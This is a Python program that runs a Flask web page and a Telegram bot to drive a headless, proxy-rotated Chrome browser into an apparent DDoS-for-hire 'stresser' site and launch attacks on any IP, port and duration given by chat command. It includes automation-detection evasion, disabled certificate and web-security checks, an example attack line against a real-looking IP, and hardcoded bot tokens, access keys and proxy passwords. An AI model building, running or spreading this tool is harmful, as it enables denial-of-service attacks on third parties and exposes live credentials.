import os
import json
import time
import pickle
import threading
import re
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from pyvirtualdisplay import Display
import logging
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== CONFIG ====================
TELEGRAM_BOT_TOKEN = "8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo"
ACCESS_KEY = "2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4"
LOGIN_URL = "https://satellitestress.st/login"
ATTACK_URL = "https://satellitestress.st/attack"
COOKIES_FILE = "cookies.pkl"
PORT = int(os.environ.get("PORT", 5000))
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{PORT}")

# ==================== YOUR PROXIES ====================
PROXY_LIST = [
    {"server": "31.59.20.176:6754", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "23.95.150.145:6114", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "198.23.239.134:6540", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "45.38.107.97:6014", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "107.172.163.27:6543", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "198.105.121.200:6462", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "64.137.96.74:6641", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "216.10.27.159:6837", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "142.111.67.146:5611", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
    {"server": "194.39.32.164:6461", "username": "lmfaxayd", "password": "ujzc9rzsc6op"}
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ==================== BROWSER MANAGER ====================
class BrowserManager:
    def __init__(self):
        self.driver = None
        self.display = None
        self.is_logged_in = False
        self.login_time = None
        self.current_proxy = None
        
    def get_proxy_auth_extension(self, proxy):
        """Create Chrome extension for proxy authentication"""
        extension_dir = os.path.join(os.getcwd(), "proxy_auth")
        os.makedirs(extension_dir, exist_ok=True)
        
        manifest = {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Proxy Auth",
            "permissions": ["proxy", "tabs", "webRequest", "webRequestBlocking", "<all_urls>"],
            "background": {"scripts": ["background.js"]}
        }
        
        with open(os.path.join(extension_dir, "manifest.json"), "w") as f:
            json.dump(manifest, f)
        
        background_js = f"""
        var config = {{
            mode: "fixed_servers",
            rules: {{
                singleProxy: {{
                    scheme: "http",
                    host: "{proxy['server'].split(':')[0]}",
                    port: parseInt("{proxy['server'].split(':')[1]}")
                }}
            }}
        }};
        chrome.proxy.settings.set({{value: config, scope: "regular"}});
        chrome.webRequest.onAuthRequired.addListener(
            function(details) {{
                return {{authCredentials: {{username: "{proxy['username']}", password: "{proxy['password']}"}}}};
            }},
            {{urls: ["<all_urls>"]}},
            ["blocking"]
        );
        """
        
        with open(os.path.join(extension_dir, "background.js"), "w") as f:
            f.write(background_js)
        
        return extension_dir
    
    def start(self):
        """Start browser with proxy"""
        try:
            # Random proxy
            self.current_proxy = random.choice(PROXY_LIST)
            logger.info(f"🌐 Using proxy: {self.current_proxy['server']}")
            
            # Proxy extension
            extension_dir = self.get_proxy_auth_extension(self.current_proxy)
            
            # Virtual display
            self.display = Display(visible=0, size=(1920, 1080))
            self.display.start()
            
            # Chrome options
            options = Options()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--headless=new")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--disable-web-security")
            options.add_argument("--allow-running-insecure-content")
            options.add_argument("--ignore-certificate-errors")
            options.add_argument(f'--load-extension={extension_dir}')
            
            # Random user agent
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            options.add_argument(f'--user-agent={random.choice(user_agents)}')
            
            # Start driver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            
            # Stealth
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info("✅ Browser started")
            
            # Load session
            if os.path.exists(COOKIES_FILE):
                self.load_session()
            
        except Exception as e:
            logger.error(f"Browser start error: {e}")
    
    def load_session(self):
        """Load saved cookies"""
        try:
            with open(COOKIES_FILE, 'rb') as f:
                cookies = pickle.load(f)
            
            self.driver.get(LOGIN_URL)
            time.sleep(2)
            
            for cookie in cookies:
                try:
                    self.driver.add_cookie(cookie)
                except:
                    pass
            
            logger.info("✅ Session loaded")
            self.check_login()
            
        except Exception as e:
            logger.error(f"Session load error: {e}")
    
    def save_session(self):
        """Save cookies"""
        try:
            cookies = self.driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
            logger.info(f"✅ Saved {len(cookies)} cookies")
            return True
        except Exception as e:
            logger.error(f"Save error: {e}")
            return False
    
    def check_login(self):
        """Check if logged in"""
        try:
            self.driver.get(ATTACK_URL)
            time.sleep(2)
            
            if "attack" in self.driver.current_url or "dashboard" in self.driver.current_url:
                self.is_logged_in = True
                self.login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                logger.info("✅ Logged in")
                return True
        except:
            pass
        
        self.is_logged_in = False
        return False
    
    def attack(self, ip, port, duration):
        """Launch attack"""
        try:
            self.driver.get(ATTACK_URL)
            time.sleep(2)
            
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "ip")))
            
            self.driver.find_element(By.NAME, "ip").send_keys(ip)
            self.driver.find_element(By.NAME, "port").send_keys(str(port))
            self.driver.find_element(By.NAME, "time").send_keys(str(duration))
            self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
            time.sleep(2)
            
            logger.info(f"✅ Attack sent")
            return True
            
        except Exception as e:
            logger.error(f"Attack error: {e}")
            return False

# ==================== TELEGRAM BOT ====================
class TelegramBot:
    def __init__(self, browser):
        self.browser = browser
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help))
        self.application.add_handler(CommandHandler("status", self.status))
        self.application.add_handler(CommandHandler("attack", self.attack))
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🚀 **Satellite Stress Bot**\n\n"
            f"🌐 Web: {RENDER_URL}\n\n"
            "**Commands:**\n"
            "/status - Check login\n"
            "/attack IP PORT TIME - Launch attack",
            parse_mode="Markdown"
        )
    
    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "📚 **Usage:**\n\n"
            "1. Open web interface\n"
            "2. Login in iframe\n"
            "3. Save session\n"
            "4. Use /attack\n\n"
            f"**Access Key:** `{ACCESS_KEY}`",
            parse_mode="Markdown"
        )
    
    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.browser.check_login()
        text = f"📊 **Status:**\n\n"
        text += f"Login: {'✅' if self.browser.is_logged_in else '❌'}\n"
        text += f"Session: {'✅' if os.path.exists(COOKIES_FILE) else '❌'}"
        await update.message.reply_text(text, parse_mode="Markdown")
    
    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.browser.is_logged_in:
            await update.message.reply_text("❌ Not logged in. Login via web first.")
            return
        
        if len(context.args) < 3:
            await update.message.reply_text("❌ Use: /attack IP PORT TIME")
            return
        
        ip, port, duration = context.args[0], context.args[1], context.args[2]
        
        await update.message.reply_text(f"🚀 Attacking {ip}:{port}...")
        
        success = await asyncio.get_event_loop().run_in_executor(
            None, self.browser.attack, ip, port, duration
        )
        
        if success:
            await update.message.reply_text("✅ Attack launched!")
        else:
            await update.message.reply_text("❌ Attack failed")
    
    def run(self):
        self.application.run_polling()

# ==================== HTML TEMPLATE (Fixed Iframe) ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Satellite Stress Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            width: 100%;
            background: white;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        .header {
            background: linear-gradient(135deg, #2563eb, #7c3aed);
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 { font-size: 24px; }
        .content { padding: 20px; }
        
        .status-bar {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .status-item {
            background: #f1f5f9;
            padding: 10px 15px;
            border-radius: 12px;
            flex: 1;
            min-width: 150px;
        }
        .status-label { color: #64748b; font-size: 12px; }
        .status-value { font-weight: 600; color: #0f172a; }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            margin-left: 5px;
        }
        .badge-success { background: #22c55e; color: white; }
        .badge-warning { background: #eab308; color: white; }
        
        .key-box {
            background: #0f172a;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 12px;
            font-family: monospace;
            word-break: break-all;
            margin: 20px 0;
            font-size: 14px;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            color: white;
            flex: 1;
            min-width: 120px;
        }
        .btn-primary { background: #2563eb; }
        .btn-success { background: #22c55e; }
        .btn-warning { background: #eab308; }
        
        .iframe-container {
            width: 100%;
            height: 600px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            overflow: hidden;
            margin: 20px 0;
            background: white;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .telegram-link {
            display: block;
            text-align: center;
            padding: 15px;
            background: #1e293b;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            margin: 20px 0;
        }
        
        .footer {
            text-align: center;
            padding: 15px;
            background: #f8fafc;
            color: #64748b;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐍 Satellite Stress Bot - Iframe Login</h1>
        </div>
        
        <div class="content">
            <!-- Status -->
            <div class="status-bar">
                <div class="status-item">
                    <div class="status-label">Login Status</div>
                    <div class="status-value">
                        <span id="loginText">{{ 'Logged In' if is_logged_in else 'Not Logged In' }}</span>
                        <span id="loginBadge" class="badge {{ 'badge-success' if is_logged_in else 'badge-warning' }}">
                            {{ 'ACTIVE' if is_logged_in else 'INACTIVE' }}
                        </span>
                    </div>
                </div>
                <div class="status-item">
                    <div class="status-label">Session</div>
                    <div class="status-value" id="sessionText">
                        {{ '✅ Saved' if session_exists else '❌ Not Saved' }}
                    </div>
                </div>
            </div>
            
            <!-- Access Key -->
            <div class="key-box">
                <strong>🔑 ACCESS KEY:</strong><br>
                {{ access_key }}
            </div>
            
            <!-- Buttons -->
            <div class="button-group">
                <button class="btn btn-primary" onclick="showLogin()">🌐 Show Login Page</button>
                <button class="btn btn-success" onclick="saveSession()">💾 Save Session</button>
                <button class="btn btn-warning" onclick="checkStatus()">🔄 Refresh Status</button>
            </div>
            
            <!-- IFrame - YAHI PE LOGIN HOGA -->
            <div class="iframe-container" id="loginIframeContainer">
                <iframe id="loginFrame" src="{{ login_url }}"></iframe>
            </div>
            
            <!-- Instructions -->
            <div style="background: #dbeafe; padding: 15px; border-radius: 12px; margin: 20px 0;">
                <strong>📝 LOGIN INSTRUCTIONS:</strong><br>
                1. Login in the iframe above ⬆️<br>
                2. Enter Access Key: <strong>{{ access_key }}</strong><br>
                3. Complete any captcha<br>
                4. After login, click "Save Session" button<br>
                5. Session saved! Now use Telegram bot.
            </div>
            
            <!-- Telegram Link -->
            <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
                📱 Open Telegram Bot
            </a>
            
            <p style="text-align: center; color: #64748b; font-size: 12px;">
                /attack 104.29.138.132 80 120
            </p>
        </div>
        
        <div class="footer">
            Render URL: {{ render_url }} | Proxy Enabled
        </div>
    </div>
    
    <script>
        // Page load par iframe already visible
        document.getElementById('loginFrame').src = '{{ login_url }}';
        
        function showLogin() {
            document.getElementById('loginFrame').src = '{{ login_url }}';
        }
        
        async function saveSession() {
            const btn = event.target;
            btn.textContent = '💾 Saving...';
            btn.disabled = true;
            
            try {
                const res = await fetch('/save-session', {method: 'POST'});
                const data = await res.json();
                alert(data.success ? '✅ Session saved!' : '❌ ' + data.message);
            } catch (e) {
                alert('❌ Error: ' + e.message);
            } finally {
                btn.textContent = '💾 Save Session';
                btn.disabled = false;
                checkStatus();
            }
        }
        
        async function checkStatus() {
            const res = await fetch('/status');
            const data = await res.json();
            
            document.getElementById('loginText').textContent = data.is_logged_in ? 'Logged In' : 'Not Logged In';
            document.getElementById('loginBadge').textContent = data.is_logged_in ? 'ACTIVE' : 'INACTIVE';
            document.getElementById('loginBadge').className = 'badge ' + (data.is_logged_in ? 'badge-success' : 'badge-warning');
            document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
        }
        
        // Auto refresh status
        setInterval(checkStatus, 5000);
    </script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================
browser = BrowserManager()

@app.route('/')
def index():
    return render_template_string(
        HTML,
        is_logged_in=browser.is_logged_in,
        session_exists=os.path.exists(COOKIES_FILE),
        login_time=browser.login_time,
        access_key=ACCESS_KEY,
        login_url=LOGIN_URL,
        render_url=RENDER_URL
    )

@app.route('/status')
def get_status():
    return jsonify({
        'is_logged_in': browser.is_logged_in,
        'session_exists': os.path.exists(COOKIES_FILE),
        'login_time': browser.login_time
    })

@app.route('/save-session', methods=['POST'])
def save_session():
    if browser.save_session():
        browser.check_login()
        return jsonify({'success': True})
    return jsonify({'success': False, 'message': 'No cookies found'})

# ==================== MAIN ====================
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def run_telegram():
    try:
        bot = TelegramBot(browser)
        bot.run()
    except Exception as e:
        logger.error(f"Telegram bot error: {e}")

if __name__ == '__main__':
    print("="*50)
    print("🚀 Starting Satellite Stress Bot")
    print("="*50)
    
    # Start browser
    browser.start()
    browser.check_login()
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Run Telegram
    run_telegram()
